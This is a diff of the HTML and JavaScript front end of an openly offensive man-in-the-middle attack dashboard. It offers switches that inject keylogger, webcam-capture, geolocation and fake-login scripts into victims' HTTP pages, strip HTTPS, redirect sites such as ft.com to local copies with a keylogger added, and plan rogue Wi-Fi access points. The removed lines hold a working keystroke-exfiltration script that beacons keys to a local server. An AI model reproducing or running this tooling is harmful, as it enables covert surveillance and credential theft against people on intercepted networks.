@@ -1,86 +1,321 @@
 {{set . "title" "Home"}}
 {{template "header.html" .}}
 
-<header class="hero-unit" style="background-color:#BC4728">
-  <div class="container">
-    <div class="row">
-      <div class="hero-text">
-        <h1>MITM Dashboard</h1>
-        <p></p>
-      </div>
-    </div>
-  </div>
+<header class="row">
+  <h1 class="col-md-4">Shakespeare Dashboard</h1>
+  <h4 class="col-md-8 attackType">disabled...</h4>
+  <p></p>
 </header>
-
-
-    <div class="buttons">
-      <ul>
-      <li><button type="button" id="replace">Replace All Images</button></li>
-      <li><button type="button" id="flip">Flip Images</button></li>
-      <li><button type="button" id="redirect">Redirect pages</button>the list of pages you can redirect...</li>
-      <li>
-        Remember to url encode e.g: <pre>&lt;script&gt;alert(1)%3B&lt;/script&gt;</pre>
-        Replace: <input type="text" id="find"  />
-        With: <input type="text" id="result"  />
-        <button type="button" id="inject">Inject Hook in HTTP</button>
-      </li>
-      <li><button type="button" id="block">Block URLs</button></li>
-      <li><button type="button" id="intercept">Intercept HTTPS</button></li>
-    </ul>
-    </div>
-    <div id="keypresses">
-      <script>
-      $( document ).ready(function(){
-          $.get( "http://127.0.0.1:9000/App/GetData", function( data ) {
-            $('#keypresses').append(data + "<br>")
-          });}, 1000);
-      </script>
-<!-- 
-      <script>var keys = '';
- 
-document.onkeypress = function(e) {
-    var get = window.event ? event : e;
-    var key = get.keyCode ? get.keyCode : get.charCode;
-    key = String.fromCharCode(key);
-    keys += key;
-}
- 
-window.setInterval(function(){
-    new Image().src = '//127.0.0.1:9000/App/AppendData?data='+keys;
-    keys = '';
-}, 1000);</script>
+<div class="main row">
+  <section class="col-md-4 proxy-controls">
+    <div class="panel panel-default">
+      <!-- Default panel contents -->
+      <div class="panel-heading">Proxy Controls
+      </div>
+      <!-- <div class="panel-body">
+        <small>Configure your smallroxy. Checked Setting will be activated.</small>
+      </div>
  -->
+      <!-- List group -->
+      <ul class="list-group">
+        <li class="list-group-item">
+          <div class="onoffswitch">
+            <input type="checkbox" name="passthrough" class="onoffswitch-checkbox" id="passthrough">
+            <label class="onoffswitch-label" for="passthrough">
+              <span class="onoffswitch-inner"></span>
+              <span class="onoffswitch-switch"></span>
+            </label>
+          </div>
+          <h4>Simple Proxy</h4>
+          <small>Allow all connections through, however the requests and responses will be stored as HAR files and any body that is sent with the request can be viewed in the HAR viewer below.</small>
+        </li>
+
+        <li class="list-group-item" id="replaceImages" title="this currently does not work"><s>Replace All Images</s></li>
+        <li class="list-group-item" id="flipImages" title="this currently does not work"><s>Flip Images</s></li>
+        <li class="list-group-item">
+          <div class="onoffswitch">
+            <input type="checkbox" name="redirect" class="onoffswitch-checkbox" id="redirect">
+            <label class="onoffswitch-label" for="redirect">
+              <span class="onoffswitch-inner"></span>
+              <span class="onoffswitch-switch"></span>
+            </label>
+          </div>
+          <h4>Redirect URLs</h4>
+          <small>Check if the site is in the array of sites to redirect, and if so will redirect to a local page with the same name i.e ft.com will get redirected to ft.html - NOTE: All redirected pages have the key logger automatically injected into them.</small>
+        </li>
+
+        <li class="list-group-item">
+          <div class="onoffswitch">
+            <input type="checkbox" name="block" class="onoffswitch-checkbox" id="block">
+            <label class="onoffswitch-label" for="block">
+              <span class="onoffswitch-inner"></span>
+              <span class="onoffswitch-switch"></span>
+            </label>
+          </div>
+          <h4>Block URLs</h4>
+          <small>Block sites that are in the list of sites to block however it cannot handle HSTS.</small>
+        </li>
+        <li class="list-group-item list-group-item-toggle dropdown-toggle" aria-expanded="false">
+          <a data-toggle="collapse" href="#collapseInject" aria-expanded="true" data-toggle="dropdown" aria-controls="collapseInject"><h4>Inject Hook in HTTP <span class="caret"></span></h4>
+          <small>Different scripts for different injections. All scripts get an automatic jquery injection.</small>
+          </a>
+          <ul class="list-group collapse" id="collapseInject">
+
+            <li class="list-group-item" title="This will inject a keylogger into the page if it can (i.e HTTP).">
+              <div class="onoffswitch">
+                <input type="checkbox" name="keylogger" class="onoffswitch-checkbox" id="keylogger">
+                <label class="onoffswitch-label" for="keylogger">
+                  <span class="onoffswitch-inner"></span>
+                  <span class="onoffswitch-switch"></span>
+                </label>
+              </div>
+              <h4>Keylogger</h4>
+              <small>Inject a keylogger into the page if it can (i.e HTTP)</small>
+            </li>
+
+            <li class="list-group-item">
+              <div class="onoffswitch">
+                <input type="checkbox" name="takePhoto" class="onoffswitch-checkbox" id="takePhoto">
+                <label class="onoffswitch-label" for="takePhoto">
+                  <span class="onoffswitch-inner"></span>
+                  <span class="onoffswitch-switch"></span>
+                </label>
+              </div>
+              <h4>Take Photo</h4>
+              <small>Attempt to take a photo with the web cam on the clients computer</small>
+            </li>
+
+            <li class="list-group-item">
+              <div class="onoffswitch">
+                <input type="checkbox" name="getLocation" class="onoffswitch-checkbox" id="getLocation">
+                <label class="onoffswitch-label" for="getLocation">
+                  <span class="onoffswitch-inner"></span>
+                  <span class="onoffswitch-switch"></span>
+                </label>
+              </div>
+              <h4>Get Location</h4>
+              <small>Attempt to get the user's location It will try and use the users public IP aswell as request them to give up their location more accurately.</small>
+            </li>
+
+            <li class="list-group-item">
+              <div class="onoffswitch">
+                <input type="checkbox" name="requestLogin" class="onoffswitch-checkbox" id="requestLogin">
+                <label class="onoffswitch-label" for="requestLogin">
+                  <span class="onoffswitch-inner"></span>
+                  <span class="onoffswitch-switch"></span>
+                </label>
+              </div>
+              <h4>Request User Location</h4>
+              <small>It will try and use the users public IP aswell as request them to give up their location more accurately.</small>
+            </li>
+          </ul>
+        <li class="list-group-item">
+        <div class="onoffswitch">
+            <input type="checkbox" name="intercept" class="onoffswitch-checkbox" id="intercept">
+            <label class="onoffswitch-label" for="intercept">
+              <span class="onoffswitch-inner"></span>
+              <span class="onoffswitch-switch"></span>
+            </label>
+          </div>
+          <h4>Wolf Pack Hack</h4>
+          <small>This will attempt to stop the clients request and make the same request itself. It will then pass the response from the server back to the client, but over HTTP. If it experiences HSTS then it will block the request. It is recommended to try and get the user to click on links to pages that are HSTS where possible.</small>
+        </li>
+      </ul>
+    </div>
+  </section>
+  <section class="col-md-8 dashboard">
+
+  <div role="tabpanel">
+
+      <!-- Nav tabs -->
+      <ul class="nav nav-tabs" role="tablist">
+        <li role="presentation" class="active"><a href="#hars" aria-controls="hars" role="tab" data-toggle="tab">Har Viewer</a></li>
+        <li role="presentation"><a href="#logs" aria-controls="logs" role="tab" data-toggle="tab">Key Logs</a></li>
+        <li role="presentation"><a href="#wifiRequests" aria-controls="wifiRequests" role="tab" data-toggle="tab"><s>Discover Local WiFi Requests</s></a></li>
+        <li role="presentation"><a href="#CreateAP" aria-controls="CreateAP" role="tab" data-toggle="tab"><s>Create Access Points</s></a></li>
+      </ul>
+
+      <!-- Tab panes -->
+      <div class="tab-content">
+
+        <div role="tabpanel" class="tab-pane active" id="hars">
+          <nav>
+            <div class="btn-group">
+              <button class="btn btn-info" id="gethars">Refresh Hars</button>
+              <div class="btn-group harList">
+                <button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-expanded="false">
+                  Select Har to Display <span class="caret"></span>
+                </button>
+                <ul class="dropdown-menu" role="menu" id="clients">
+                  <li><a href="#">None, yet. Please Refresh Hars</a></li>
+                </ul>
+              </div>
+            </div>
+            <button class="btn btn-danger" id="deletehars">Delete current data</button>
+            <!-- dropdown button -->
+          </nav>
+
+          <div id='har-view'></div> <!-- har viewer here -->
+        </div>
+
+        <div role="tabpanel" class="tab-pane" id="logs">
+          <div id='userLogs'></div>
+        </div>
+        <div role="tabpanel" class="tab-pane" id="wifiRequests">
+          <p>This is to discover the SSIDs that devices are trying to connect to. Useful for creating hotspots for targetted attacks</p>
+          <div id='wifi-requests'></div>
+        </div>
+        <div role="tabpanel" class="tab-pane" id="CreateAP">
+          <input type="text" class=".input-prepend" title="name for the wifi access point" placeholder="access point name">
+        </div>
+      </div>
+
     </div>
 
-
+  </section>
+</div>
 <script type="text/javascript">
-  $("#replace").click(function() {
-    $.get( "/ReplaceImages", function( data ) {
+
+  $(".toplevel").click(function() {
+    $(".btn").removeClass("btn-success")
+    $(this).addClass("btn-success")
+  })
+  $("#passthrough").click(function() {
+    $.get( "/PassThrough", function( data ) {
+      $(".attackType").html("Simple - capture headers")
+    });
+  })
+  $("#deletehars").click(function() {
+     $.get( "/App/DeleteHars", function( data ) {
+      $.each(data, function(i, d) {
+        var descr = d.split("_", -1)
+        console.log(descr)
+        $("#clients").append('<button class="btn btn-default" id="passthrough">'+descr[1]+' : ' + descr[2]+'</button>')
+      })
     });
   })
   $("#intercept").click(function() {
     $.get( "/InterceptHTTPS", function( data ) {
+      $(".attackType").html("Wolf Pack Hack - remove HTTPS")
     });
   })
-  $("#flip").click(function() {
-    $.get( "/FlipImages", function( data ) {
-    });
+  $("#flipImages").click(function() {
+    alert("flipping images currently disabled")
+    // $.get( "/FlipImages", function( data ) {
+    //   $(".attackType").html("Flip Images")
+    // });
+  })
+  $("#replaceImages").click(function() {
+    alert("Replacing images currently disabled")
+    // $.get( "/FlipImages", function( data ) {
+    //   $(".attackType").html("Flip Images")
+    // });
   })
   $("#redirect").click(function() {
-    $.get( "/ReplacePage", function( data ) {
+    $.get( "/RedirectPage", function( data ) {
+      $(".attackType").html("Redirect Websites: " + data)
     });
   })
   $("#block").click(function() {
     $.get( "/BlockWebsites", function( data ) {
+      $(".attackType").html("Block Websites: " + data)
     });
   })
-  $("#inject").click(function() {
-    var find = $("#find").val();
-    var result = $("#result").val();
-    console.log(find)
-    console.log(result)
-    $.get( "/InjectScript?replace="+find+"&result="+result, function( data ) {
+  $("#keylogger").click(function() {
+    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2Fkeylogger.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
+      $(".attackType").html("Injected - Keylogger")
     });
   })
+ $("#getLocation").click(function() {
+    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FgetLocation.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
+      $(".attackType").html("Injected - request location")
+    });
+  })
+ $("#takePhoto").click(function() {
+    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FtakePhoto.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
+      $(".attackType").html("Injected - request photo")
+    });
+  })
+   $("#requestLogin").click(function() {
+    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2Flogin.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
+      $(".attackType").html("Injected - request Login")
+    });
+  })
+  $("#getKeyLogs").click(function() {
+    $('#userLogs').html("")//clear
+      $.get("/App/GetData", function ( data ) {
+        var lastURL = data[0].Page
+        $('#userLogs').append(lastURL+"<p>")
+        $.each(data, function(i, j) {
+          if ( j.Page === lastURL ) {
+            $('#userLogs').append(j.Content)
+          } else {
+            $('#userLogs').append("<p>"+j.Page)
+            $('#userLogs').append(j.Content)
+          }
+          lastURL = j.Page
+        })
+
+      })
+
+  })
+  //get the hars that have been collected
+  //update for each connected client
+  $("#gethars").click(function() {
+    $("#clients").html("")
+    $.getJSON("/App/GetHars", function( data ) {
+    $(".attackType").html("Injected - Get Har Files")
+    $.each(data, function(i, j) {
+      var descr = j.split("_", -1)
+      var listItem = $('<li><a href="#" id="'+j+'">'+descr[1]+' : ' + descr[2]+'</a></li>').click(function() {
+        $.getJSON( "/public/hars/"+j, function( data ) {
+            initHarView();
+            har.render(data);
+        });
+      })
+      $("#clients").append(listItem)
+    })
+  })
+  })
+
+  // bootstrap for toggle insted of click as above
+  $(function () {
+    $('.onoffswitch :checkbox').change(function() {
+        // checked true or false, id of toggle
+        console.log(this.checked, this.id);
+
+        // switch by id, then check if checked is true
+        switch(this.id) {
+            case "takePhoto":
+                console.log(this.checked, "taking the photo");
+                if(this.checked){
+                  // inject!
+                } else {
+                  // deject
+                }
+                break;
+            default:
+                console.log("toggled option that doesn't exist.")
+        }
+
+    });
+  });
+
+var har;
+function initHarView(){
+   $('#har-view').data('HarView', null);
+   // har = null;
+   $('#hars-discovered').empty()
+   $('#har-view').html('');
+   $('#har-view').HarView();
+   har = $('#har-view').data('HarView');
+
+}
+//get the latest hars that are available
+$(document).ready(function() {
+  initHarView();
+})
+
 </script>
+
 {{template "footer.html" .}}
